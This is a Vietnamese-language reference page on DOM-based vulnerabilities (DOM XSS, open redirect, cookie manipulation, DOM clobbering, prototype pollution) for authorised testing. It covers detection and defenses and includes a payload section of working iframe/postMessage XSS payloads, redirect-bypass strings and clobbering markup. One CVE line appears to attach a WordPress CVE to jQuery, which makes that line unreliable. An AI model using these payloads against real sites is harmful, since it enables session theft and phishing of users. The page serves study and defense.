# DOM-Based Vulnerabilities

> JS phía client xử lý dữ liệu do kẻ tấn công kiểm soát một cách không an toàn trong DOM. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/dom.md`](../../../../Troubleshooting_Guide/dom.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** DOM XSS / clobbering · A03:2021
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
Một lỗ hổng dạng DOM tồn tại hoàn toàn trong trình duyệt: JavaScript phía client đọc dữ liệu chịu
ảnh hưởng của kẻ tấn công (một "nguồn"/source) và truyền nó tới một thao tác nguy hiểm (một
"sink") mà không làm sạch. Máy chủ không bao giờ nhìn thấy payload độc hại — lỗi nằm ngay trong
script của chính trang.

## Cơ chế hoạt động (How it works)
Kẻ tấn công kiểm soát một nguồn như `location.hash`, `document.URL`, `document.referrer`, một
cookie, hoặc `data` của một sự kiện `postMessage`. JavaScript của trang đọc giá trị đó và đưa vào
một sink — `innerHTML`, `document.write`, `eval`, `location.href`, `iframe.src` — nơi nó được diễn
giải thành markup, mã, hoặc đích điều hướng. Vì phép biến đổi nguy hiểm xảy ra ở phía client, việc
lọc phía máy chủ và thậm chí CSP chỉ giám sát phản hồi mạng có thể bỏ lọt. Các biến thể ngoài DOM
XSS kinh điển còn bao gồm open redirect (URL được ghi vào `location`), thao túng cookie, DOM
clobbering (thuộc tính `id`/`name` được tiêm vào che khuất các biến global của JS), và prototype
pollution thông qua JSON do kẻ tấn công cung cấp.

## Tác động (Impact)
Tương đương với reflected/stored XSS khi sink thực thi script: đánh cắp phiên, chiếm tài khoản, và
các hành động thực hiện thay nạn nhân. Biến thể open-redirect cho phép lừa đảo (phishing) và rò rỉ
token OAuth; clobbering và prototype pollution có thể vô hiệu hóa bộ làm sạch hoặc lật các cờ bảo
mật. Mức độ nghiêm trọng dao động từ trung bình (open redirect) đến cao/nghiêm trọng (DOM XSS dẫn
tới ATO).

## Cách phát hiện (How to detect)
- Một giá trị nguồn (hash, query param, message) xuất hiện được phản chiếu vào HTML của trang hoặc
  kích hoạt điều hướng mà không cần round-trip tới máy chủ.
- Grep JS phía client tìm các mẫu sink (`innerHTML`, `document.write`, `eval`, `location =`) có thể
  tiếp cận từ một nguồn; đặt breakpoint trên các sink đó trong devtools của trình duyệt để xác nhận
  luồng dữ liệu.
- Một listener `message` được đăng ký mà không kiểm tra `origin`/`source`, hoặc xác thực URL bằng
  `indexOf`/regex thay vì phân giải nghiêm ngặt.
- Hook `addEventListener` hoặc setter `innerHTML` (xem mục Công cụ phát hiện) sẽ bộc lộ các sink
  đang hoạt động.

## Khai thác (tóm tắt) (Exploitation)
Ánh xạ một nguồn kiểm soát được tới một sink có thể tiếp cận, rồi tạo đầu vào mà sink diễn giải sai:
markup kèm event handler cho `innerHTML`, một URL `javascript:` cho các sink điều hướng, một payload
JSON `__proto__` cho sink gán-vào-object, hoặc các phần tử trùng id để clobber một biến global. Các
biến thể web-message và cookie được phát từ trang của kẻ tấn công qua một `<iframe>` khác origin.
Payload đầy đủ nằm trong mục Payload phía trên.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### DOM XSS qua web message (DOM XSS via web messages)
Listener không kiểm tra origin, ghi `event.data` vào một sink.
```html
<!-- innerHTML sink -->
<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"></iframe>
<!-- URL check uses indexOf (substring) not startsWith -->
<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"></iframe>
<!-- JSON message whose url field is set on iframe.src -->
<iframe src='https://TARGET.net/' onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'></iframe>
```

### Thao túng cookie dựa trên DOM (DOM-based cookie manipulation)
Đầu độc một cookie qua một trang, rồi kích hoạt việc render nó ở một trang khác.
```html
<iframe src="https://TARGET.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://TARGET.net';window.x=1;"></iframe>
```
Lần tải 1 lưu URL độc hại vào một cookie; chuyển hướng onload về trang chủ sẽ render cookie đã bị đầu độc.

### Open redirect dựa trên DOM (DOM-based open redirect)
Một regex xác thực *định dạng* URL nhưng không xác thực đích.
```http
GET /post?postId=4&url=https://ATTACKER.net/
```
Các biến thể giao thức đánh bại các kiểm tra ngây thơ:
```text
//attacker.com
\/\/attacker.com
%2F%2Fattacker.com
https:attacker.com
https://yourdomain.com@attacker.com
```

### DOM clobbering
```html
<!-- clobber a `window.x || {…}` fallback via duplicate-id anchors -->
<a id="defaultAvatar"><a id="defaultAvatar" name="avatar" href='cid:"onerror=alert(1)//'></a></a>
<!-- clobber form.attributes to break a sanitizer's property loop (HTMLJanitor bypass) -->
<form id="x" tabindex="0" onfocus="print()"><input id="attributes" /></form>
```
Kích hoạt trường hợp thứ hai bằng cách thêm id dưới dạng fragment:
```html
<iframe src="https://TARGET/post?postId=3" onload="setTimeout(()=>this.src=this.src+'#x',500)"></iframe>
```

### Prototype pollution qua web message (Prototype pollution via web messages)
```javascript
postMessage('{"__proto__":{"isAdmin":true}}', "*");   // when app does Object.assign({}, JSON.parse(event.data))
```

### Các sink nguy hiểm (Dangerous sinks)
| Sink | Ví dụ |
|------|---------|
| `innerHTML` / `outerHTML` | `el.innerHTML = userData` |
| `document.write` | `document.write(html)` |
| `location.href` | `location.href = userUrl` |
| `iframe.src` | `iframe.src = userUrl` |
| `eval` / `setTimeout` | `eval(userCode)` |

### Công cụ phát hiện (Discovery tooling)
```javascript
// Probe a postMessage listener from the target's console
window.postMessage("<b>bold</b>", "*");
window.postMessage("javascript:alert(1)", "*");
window.postMessage('{"type":"load-channel","url":"javascript:alert(1)"}', "*");

// Enumerate message listeners as they register
var orig = EventTarget.prototype.addEventListener;
EventTarget.prototype.addEventListener = function(type, fn, opts) {
  if (type === "message") console.log("[message listener]", fn.toString());
  return orig.call(this, type, fn, opts);
};
location.reload();

// Trace writes to a sink
Object.defineProperty(Element.prototype, "innerHTML", {
  set(val) { console.trace("[innerHTML]", val.substring(0,100));
    return Object.getOwnPropertyDescriptor(Element.prototype,"innerHTML").set.call(this,val); }
});
```

## Phòng chống (Defenses)
1. **Tránh các sink nguy hiểm** — dùng `textContent` thay cho `innerHTML`, dựng node DOM qua các API
   an toàn, và không bao giờ truyền dữ liệu không tin cậy vào `eval`/`setTimeout`/`Function`.
2. **Xác thực và phân giải nguồn nghiêm ngặt** — với điều hướng, dùng allowlist cho đích và phân
   giải URL bằng URL API; từ chối mọi thứ không phải same-origin/tương đối thay vì so khớp định dạng
   bằng regex.
3. **Xác minh `origin` và `source` của `postMessage`** trong mọi listener `message` trước khi dùng
   `event.data`.
4. **Làm sạch HTML không thể tránh** bằng DOMPurify, và bật **Trusted Types**
   (`require-trusted-types-for 'script'`) để trình duyệt chặn các phép gán chuỗi-vào-sink.
5. Đóng băng prototype / dùng `Object.create(null)` và `Map` để giảm thiểu clobbering và prototype
   pollution.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=DOM-Based+Vulnerabilities
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=DOM-Based+Vulnerabilities
- **Exploit-DB** — https://www.exploit-db.com/search?q=DOM-Based+Vulnerabilities
- **GitHub Advisories** — https://github.com/advisories?query=DOM-Based+Vulnerabilities
- **OSV** — https://osv.dev/list?q=DOM-Based+Vulnerabilities
- **Cộng đồng** — r/netsec, blog bảo mật của nhà cung cấp, HackerOne Hacktivity, infosec trên X/Twitter.
- _Mẹo tìm kiếm: thêm sản phẩm + phiên bản mục tiêu, ví dụ `DOM-Based Vulnerabilities <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi trích dẫn._
- `CVE-2018-6389` / ngoài các sự cố thuộc lớp DOM-XSS, `CVE-2020-11022` & `CVE-2020-11023` — DOM-based
  XSS trong jQuery qua `html()`/`append()` khi HTML được tạo thủ công truyền vào các phương thức
  thao tác DOM.
- `CVE-2015-9251` — phản hồi AJAX khác domain của jQuery bị thực thi như script (sink DOM-based XSS).
- _Ví dụ kinh điển: vô số single-page app ghi `location.hash` vào `innerHTML`, mẫu DOM XSS điển hình
  được PortSwigger ghi nhận._

## Tham khảo (References)
- PortSwigger Web Security Academy — DOM-based vulnerabilities & DOM XSS.
- OWASP — DOM-based XSS Prevention Cheat Sheet.
- W3C — Trusted Types specification.
